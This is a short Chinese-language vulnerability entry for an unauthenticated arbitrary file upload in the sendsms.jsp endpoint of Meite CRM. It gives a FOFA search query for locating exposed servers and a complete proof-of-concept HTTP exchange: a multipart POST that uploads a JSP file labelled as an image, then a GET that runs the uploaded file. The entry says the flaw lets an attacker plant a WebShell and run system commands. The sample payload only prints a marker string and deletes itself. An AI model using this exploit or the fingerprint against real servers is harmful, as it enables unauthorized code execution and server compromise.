## 美特CRM sendsms.jsp 文件上传漏洞

## 漏洞描述
美特CRM `sendsms.jsp` 接口允许未授权上传任意文件，攻击者可写入 WebShell 并执行系统命令，危及服务器安全。

## 网络空间测绘
```
fofa: body="/common/scripts/basic.js"
```

## POC
```
POST /business/common/sms/sendsms.jsp HTTP/1.1
Host: [请补充实际域名]
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---WebKitFormBoundaryFfJZ4P1AZBixjELj
Content-Length: 315

---WebKitFormBoundaryFfJZ4P1AZBixjELj
Content-Disposition: form-data; name="file"; filename="4ejbsz.jsp"
Content-Type: image/jpeg

<% out.println("pboyjnnrfipmplsukdeczudsefXmywe"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>

---WebKitFormBoundaryFfJZ4P1AZBixjELj--
```

```
GET /userfile/temp/8a80808c9a6714a1019a6e86f64612fc.jsp HTTP/1.1
Host: [请补充实际域名]
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept-Encoding: gzip
Cookie: JSESSIONID=87D866035AEF766B5696607F23614513
```

## 参考
- 社区情报

